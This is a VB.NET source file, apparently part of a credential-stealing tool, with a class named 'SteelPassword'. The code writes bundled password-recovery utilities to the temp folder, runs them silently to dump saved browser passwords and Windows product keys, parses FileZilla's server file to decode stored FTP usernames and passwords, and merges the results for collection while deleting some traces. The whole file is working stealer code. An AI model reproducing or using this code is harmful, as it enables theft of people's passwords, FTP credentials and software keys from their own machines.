﻿Imports System.IO
Imports System.Threading
Imports System.Windows.Forms
Imports System.Text.RegularExpressions
Imports System.Text
Public Class SteelPassword
    Dim Data As String
    Public a As String
    Public Function Dump()
        FileZillaStealer()
        Dim result As String
        Try
            File.WriteAllBytes(IO.Path.GetTempPath & "\WebPass.exe", My.Resources.WebBrowserPassView)
            File.WriteAllBytes(IO.Path.GetTempPath & "\ProdKey.exe", My.Resources.ProduKey)
            Shell(IO.Path.GetTempPath & "\WebPass.exe /stext " & IO.Path.GetTempPath & "\" & "passlist.txt")
            Shell(IO.Path.GetTempPath & "\ProdKey.exe /stext " & IO.Path.GetTempPath & "\" & "passlist2.txt")
            IO.File.WriteAllText(IO.Path.GetTempPath & "\" & "filezilla.txt", "-------------------[ FTP Data ]-------------------" & vbNewLine & Data & "--------------------------------------------------")
            result = CleanPasswords(IO.Path.GetTempPath & "\" & "passlist.txt") & CleanPasswords(IO.Path.GetTempPath & "\" & "passlist2.txt") & vbNewLine & IO.File.ReadAllText(IO.Path.GetTempPath & "\" & "filezilla.txt")
            IO.File.Delete(IO.Path.GetTempPath & "\passlist.txt")
            IO.File.Delete(IO.Path.GetTempPath & "\passlis2.txt")
        Catch ex As Exception
            MsgBox(ex.Message)
        End Try
        Return result
    End Function
    Public Sub FileZillaStealer()
        Try
            Dim datafile As String() = Split(IO.File.ReadAllText(Environ("APPDATA") & "\FileZilla\recentservers.xml"), "<Server>")
            For Each user As String In datafile
                Dim spliter = Split(user, vbNewLine)
                For Each I As String In spliter
                    If I.Contains("<Host>") Then
                        Data += "Host : " & Split(Split(I, "<Host>")(1), "</Host>")(0) & vbNewLine
                    End If
                    If I.Contains("<User>") Then
                        Data += "Username : " & Split(Split(I, "<User>")(1), "</User>")(0) & vbNewLine
                    End If
                    If I.Contains("<Pass " & My.Resources.String1 & ">") Then
                        Data += "Password : " & DEB(Split(Split(I, "<Pass " & My.Resources.String1 & ">")(1), "</Pass>")(0)) & vbNewLine
                    End If
                    If I.Contains("<Pass>") Then
                        Data += "Password : " & Split(Split(I, "<Pass>")(1), "</Pass>")(0)
                    End If
                Next
            Next

        Catch
            Data += "FileZilla Does Not Contains any Passwords." & vbNewLine & "or the plugin does not support the current filezilla." & vbNewLine
        End Try
    End Sub
    Public Function DEB(ByRef s As String) As String ' Decode Base64
        Dim b As Byte() = Convert.FromBase64String(s)
        DEB = System.Text.Encoding.UTF8.GetString(b)
    End Function
    Public Function CleanPasswords(ByVal PasswordFile As String)
        Dim TextBox1 As New TextBox
        TextBox1.Multiline = True
        Dim A() As String = IO.File.ReadAllLines(PasswordFile)
        For Each line As String In A
            If line.Contains("Filename          :") Then
                line = line.Replace(line, "")
            End If
            If line.Contains("Password Field    :") Then
                line = line.Replace(line, "")
            End If
            If line.Contains("User Name Field   :") Then
                line = line.Replace(line, "")
            End If
            If line.Contains("Password Strength :") Then
                line = line.Replace(line, "")
            End If
            If line.Contains("Web Browser       :") Then
                line = line.Replace(line, "")
            End If
            If line.Contains("Created Time      :") Then
                line = line.Replace(line, "")
            End If
            If line.Contains("Modified Time     :") Then
                line = line.Replace(line, "")
            End If
            If line.Contains("Installation Folder : ") Then
                line = line.Replace(line, "")
            End If
            If line.Contains("Service Pack      :") Then
                line = line.Replace(line, "")
            End If
            If line.Contains("Build Number      :") Then
                line = line.Replace(line, "")
            End If
            If line.Contains("Computer Name     :") Then
                line = line.Replace(line, "")
            End If
            If line.Contains("Modified Time     :") Then
                line = line.Replace(line, "")
            End If
            line = line.Replace("==================================================", "--------------------------------------------------")
            TextBox1.AppendText(vbNewLine & line)
        Next
        Dim tmp() As String = TextBox1.Text.Split(CChar(vbNewLine))
        TextBox1.Clear()
        For Each lines As String In tmp
            If lines.Length > 1 Then
                TextBox1.AppendText(lines & vbNewLine)
            End If
        Next
        Return TextBox1.Text
    End Function
End Class
